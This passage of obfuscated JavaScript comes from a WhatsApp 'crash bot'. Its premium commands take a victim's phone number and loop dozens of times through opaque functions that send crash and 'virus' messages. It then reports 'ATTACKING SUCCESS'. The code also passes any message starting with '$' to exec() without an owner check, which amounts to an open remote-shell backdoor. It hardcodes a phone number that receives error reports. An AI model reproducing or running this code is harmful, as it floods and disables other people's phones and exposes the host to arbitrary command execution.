          await f93(target, v220);
          await f92(target, v219);
          await f93(target, v220);
          await f92(target, v219);
          await f94(target, v220);
          f86(target);
          f86(target);
          f86(target);
          f87(target);
          f88(target);
          f87(target);
          f88(target);
          await f80(target);
          await f79(target);
          await f78(target);
          await f77(target);
          await f76(target);
          await f75(target);
          await f74(target);
          await f72(target);
          await f71(target);
          await f70(target);
          await f69(target);
          await f68(target);
          await f60(target);
          await f67(target);
          await f66(target);
          await f65(target);
          await f64(target);
          await f63(target);
          await f62(target);
          await f61(target);
          await f58(target);
          await f59(target);
          darkphonk = fs.readFileSync("./all/tod.mp3");
        }
        vF8(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
        
        𝐓𝐀𝐑𝐆𝐄𝐓 : ${target} 
        𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`);
        await p154.sendMessage(p155.chat, {
          audio: darkphonk,
          mimetype: "audio/mp4",
          ptt: true
        }, {
          quoted: p155
        });
        break;
      case "ori-hancur":
      case "matot-ganas":
      case "xian-bugfixxed":
      case "xiaw-freezex":
      case "julxian-comboxz":
        if (!v196) {
          return vF8(mess.only.premium);
        }
        if (!q) {
          return vF8("Example: " + (v126 + v128) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF8(v156);
        for (let v237 = 0; v237 < 50; v237++) {
          await _0x83cd76(p154, target, "p", 1020000, ptcp = true);
          f96(target, v218);
          await f96(target, v218);
          await _0xeeb5f(p154, target, v218);
          await f97(target, v218);
          await _0x205cb3(p154, target, v218);
          await f93(target, v220);
          await f92(target, v219);
          await f93(target, v220);
          await f92(target, v219);
          await f94(target, v220);
          f86(target);
          f86(target);
          f86(target);
          f87(target);
          f88(target);
          f87(target);
          f88(target);
          await f80(target);
          await f79(target);
          await f78(target);
          await f77(target);
          await f76(target);
          await f75(target);
          await f74(target);
          await f72(target);
          await f71(target);
          await f70(target);
          await f69(target);
          await f68(target);
          await f60(target);
          await f67(target);
          await f66(target);
          await f65(target);
          await f64(target);
          await f63(target);
          await f62(target);
          await f61(target);
          await f58(target);
          await f59(target);
        }
        vF8(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
        
        𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
        𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
        
            𝐍𝐎𝐓𝐄
            > Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`);
        break;
      case "manzx-vulberaritas":
      case "executive":
      case "domination":
      case "beta-crash":
      case "fixxed-beta":
        if (!v196) {
          return vF8(mess.only.premium);
        }
        if (!q) {
          return vF8("Example: " + (v126 + v128) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF8(v156);
        for (let v238 = 0; v238 < 30; v238++) {
          await _0x83cd76(p154, target, "p", 1020000, ptcp = true);
          f96(target, v218);
          await f96(target, v218);
          await _0xeeb5f(p154, target, v218);
          await f97(target, v218);
          await _0x205cb3(p154, target, v218);
          await f93(target, v220);
          await f92(target, v219);
          await f93(target, v220);
          await f92(target, v219);
          await f94(target, v220);
          f86(target);
          f86(target);
          f86(target);
          f87(target);
          f88(target);
          f87(target);
          f88(target);
          await f80(target);
          await f79(target);
          await f78(target);
          await f77(target);
          await f76(target);
          await f75(target);
          await f74(target);
          await f72(target);
          await f71(target);
          await f70(target);
          await f69(target);
          await f68(target);
          await f60(target);
          await f67(target);
          await f66(target);
          await f65(target);
          await f64(target);
          await f63(target);
          await f62(target);
          await f61(target);
          await f58(target);
          await f59(target);
        }
        vF8(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
        
        𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
        𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
        
            𝐍𝐎𝐓𝐄
            > Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`);
        break;
      case "manzxdev":
      case "ios":
      case "iphonebutut":
      case "manz-ios":
      case "iossepele":
      case "🔥":
      case "🌷":
      case "☠":
      case "🌹":
      case "🥶":
        if (!v196) {
          return vF8(mess.only.premium);
        }
        if (!q) {
          return vF8("Example: " + (v126 + v128) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF8(v156);
        for (let v239 = 0; v239 < 40; v239++) {
          await _0x83cd76(p154, target, "p", 1020000, ptcp = true);
          await f96(target, v218);
          await _0xeeb5f(p154, target, v218);
          await f97(target, v218);
          await _0x205cb3(p154, target, v218);
          await f93(target, v220);
          await f92(target, v219);
          await f93(target, v220);
          await f92(target, v219);
          await f94(target, v220);
          f86(target);
          f86(target);
          f86(target);
          f87(target);
          f88(target);
          f87(target);
          f88(target);
          await f80(target);
          await f79(target);
          await f78(target);
          await f77(target);
          await f76(target);
          await f75(target);
          await f74(target);
          await f72(target);
          await f71(target);
          await f70(target);
          await f69(target);
          await f68(target);
          await f60(target);
          await f67(target);
          await f66(target);
          await f65(target);
          await f64(target);
          await f63(target);
          await f62(target);
          await f61(target);
          await f58(target);
          await f59(target);
        }
        vF8(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
        
        𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
        𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
        
            𝐍𝐎𝐓𝐄
            > Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`);
        break;
      case "crash-ui":
      case "system-ui":
      case "lock-uisistem":
      case "cvvxbeta-fixxed":
      case "convervisionx-rowr":
      case "manzxjulx-cvvx":
      case "julxian-xxx":
      case "xiawmeong-cvvx":
        if (!v196) {
          return vF8(mess.only.premium);
        }
        if (!q) {
          return vF8("Example: " + (v126 + v128) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF8(v156);
        for (let v240 = 0; v240 < 40; v240++) {
          await _0x83cd76(p154, target, "p", 1020000, ptcp = true);
          f96(target, v218);
          await f96(target, v218);
          await _0xeeb5f(p154, target, v218);
          await f97(target, v218);
          await _0x205cb3(p154, target, v218);
          await f93(target, v220);
          await f92(target, v219);
          await f93(target, v220);
          await f92(target, v219);
          await f94(target, v220);
          f86(target);
          f86(target);
          f86(target);
          f87(target);
          f88(target);
          f87(target);
          f88(target);
          await f80(target);
          await f79(target);
          await f78(target);
          await f77(target);
          await f76(target);
          await f75(target);
          await f74(target);
          await f72(target);
          await f71(target);
          await f70(target);
          await f69(target);
          await f68(target);
          await f60(target);
          await f67(target);
          await f66(target);
          await f65(target);
          await f64(target);
          await f63(target);
          await f62(target);
          await f61(target);
          await f58(target);
          await f59(target);
        }
        vF8(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
        
        𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
        𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
        
            𝐍𝐎𝐓𝐄
            > Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`);
        break;
      case "crashui":
      case "crashv1":
      case "crashv2":
      case "serangui":
      case "crash-zfx":
      case "zxxcrash":
        if (!v196) {
          return vF8(mess.only.premium);
        }
        if (!q) {
          return vF8("Example: " + (v126 + v128) + " 62×××");
        }
        target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        vF8(v156);
        for (let v241 = 0; v241 < 40; v241++) {
          await _0x83cd76(p154, target, "p", 1020000, ptcp = true);
          f96(target, v218);
          await f96(target, v218);
          await _0xeeb5f(p154, target, v218);
          await f97(target, v218);
          await _0x205cb3(p154, target, v218);
          await f93(target, v220);
          await f92(target, v219);
          await f93(target, v220);
          await f92(target, v219);
          await f94(target, v220);
          f86(target);
          f86(target);
          f86(target);
          f87(target);
          f88(target);
          f87(target);
          f88(target);
          await f80(target);
          await f79(target);
          await f78(target);
          await f77(target);
          await f76(target);
          await f75(target);
          await f74(target);
          await f72(target);
          await f71(target);
          await f70(target);
          await f69(target);
          await f68(target);
          await f60(target);
          await f67(target);
          await f66(target);
          await f65(target);
          await f64(target);
          await f63(target);
          await f62(target);
          await f61(target);
          await f58(target);
          await f59(target);
        }
        vF8(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』
        
        𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
        𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
        
                𝐍𝐎𝐓𝐄
                > Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`);
        break;
      case "owner":
        {
          if (!v196) {
            return vF8("Mau Ngapain Dek ??");
          }
          const v242 = await p154.sendMessage(v122, {
            contacts: {
              displayName: v221.length + " Kontak",
              contacts: v221
            },
            contextInfo: {
              forwardingScore: 9999999,
              isForwarded: true,
              mentionedJid: [v136]
            }
          }, {
            quoted: p155
          });
          p154.sendMessage(v122, {
            text: "Nih Owner Gw Jangan Macem\"",
            contextInfo: {
              forwardingScore: 9999999,
              isForwarded: true,
              mentionedJid: [v136]
            }
          }, {
            quoted: v242
          });
        }
        break;
      case "addowner":
        if (!v197) {
          return vF8(mess.only.owner);
        }
        if (!v129[0]) {
          return vF8("Penggunaan " + (v126 + v128) + " nomor\nContoh " + (v126 + v128) + " 62×××");
        }
        bnnd = q.split("|")[0].replace(/[^0-9]/g, "");
        let v243 = await p154.onWhatsApp(bnnd + "@s.whatsapp.net");
        if (v243.length == 0) {
          return vF8("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!");
        }
        v194.push(bnnd);
        fs.writeFileSync("./all/dtbs/owner.json", JSON.stringify(v194));
        vF8("Nomor " + bnnd + " Telah Menjadi Owner!!!");
        break;
      case "delowner":
        if (!v197) {
          return vF8(mess.only.owner);
        }
        if (!v129[0]) {
          return vF8("Penggunaan " + (v126 + v128) + " nomor\nContoh " + (v126 + v128) + " 62×××");
        }
        ya = q.split("|")[0].replace(/[^0-9]/g, "");
        unp = v194.indexOf(ya);
        v194.splice(unp, 1);
        fs.writeFileSync("./all/dtbs/owner.json", JSON.stringify(v194));
        vF8("Nomor " + ya + " Telah Di Hapus Owner!!!");
        break;
      case "owner":
        {
          if (!v197) {
            return vF8("kusus owner");
          }
          if (!v131) {
            return vF8("Contoh : " + (v126 + v128) + " 62×××");
          }
          global.owner = v131.split("|")[0];
          vF8(`Exif berhasil diubah menjadi
          
          • No Owner : ${global.owner}`);
        }
        break;
      case "self":
        {
          if (!v197) {
            return vF8(mess.only.owner);
          }
          p154.public = false;
          vF8("Succes Mode Private");
        }
        break;
      case "addprem":
        {
          if (!v197) {
            return vF8(mess.only.owner);
          }
          if (!v129[0]) {
            return vF8("Penggunaan " + (v126 + v128) + " nomor\nContoh " + (v126 + v128) + " 62×××");
          }
          prrkek = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          let v244 = await p154.onWhatsApp(prrkek);
          if (v244.length == 0) {
            return vF8("Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!");
          }
          v193.push(prrkek);
          fs.writeFileSync("./all/dtbs/premium.json", JSON.stringify(v193));
          vF8("Nomor " + prrkek + " Telah Menjadi Premium!");
        }
        break;
      case "delprem":
        {
          if (!v197) {
            return vF8(mess.only.owner);
          }
          if (!v129[0]) {
            return vF8("Penggunaan " + (v126 + v128) + " nomor\nContoh " + (v126 + v128) + " 62×××");
          }
          ya = q.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          unp = v193.indexOf(ya);
          v193.splice(unp, 1);
          fs.writeFileSync("./all/dtbs/premium.json", JSON.stringify(v193));
          vF8("Nomor " + ya + " Telah Di Hapus Premium!");
        }
        break;
      case "public":
        {
          if (!v197) {
            return vF8(mess.only.owner);
          }
          p154.public = true;
          vF8("Succes Mode Public");
        }
        break;
      case "restart":
        if (!v197) {
          return vF8(mess.only.owner);
        }
        vF8("Restarting Bot.....");
        setTimeout(() => {
          process.send("reset");
        }, 3000);
        break;
      case "totalfitur":
        {
          ngaceng = fs.readFileSync("./ManzCas.js").toString();
          matches = ngaceng.match(/case '[^']+'(?!.*case '[^']+')/g) || [];
          caseCount = matches.length;
          caseNames = matches.map(p303 => p303.match(/case '([^']+)'/)[1]);
          let v245 = await p154.fetchBlocklist();
          let v246 = Object.values(await p154.groupFetchAllParticipating().catch(p304 => null));
          let vCaseCount2 = caseCount;
          let v247 = caseNames.join("\n${prefix} ");
          vF8(" *Haii " + v138 + "*\n\n𝐓𝐨𝐭𝐚𝐥 𝐅𝐢𝐭𝐮𝐫 : *" + vF5() + " Fitur*");
        }
        break;
      default:
    }
    if (v125.startsWith("$")) {
      exec(v125.slice(2), (p305, p306) => {
        if (p305) {
          return vF8(p305);
        }
        if (p306) {
          return vF8(p306);
        }
      });
    }
    if (v125.startsWith(">")) {
      if (!v197) {
        return vF8(mess.only.owner);
      }
      try {
        let v248 = await eval(v125.slice(2));
        if (typeof v248 !== "string") {
          v248 = require("util").inspect(v248);
        }
        await vF8(v248);
      } catch (_0x28b25a) {
        vF8(String(_0x28b25a));
      }
    }
  } catch (_0x4a9a81) {
    console.log(_0x4a9a81);
    p154.sendMessage("6285724269841@s.whatsapp.net", {
      text: "" + util.format(_0x4a9a81)
    });
  }
};
let v249 = require.resolve(__filename);
fs.watchFile(v249, () => {
  fs.unwatchFile(v249);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[v249];
  require(v249);
});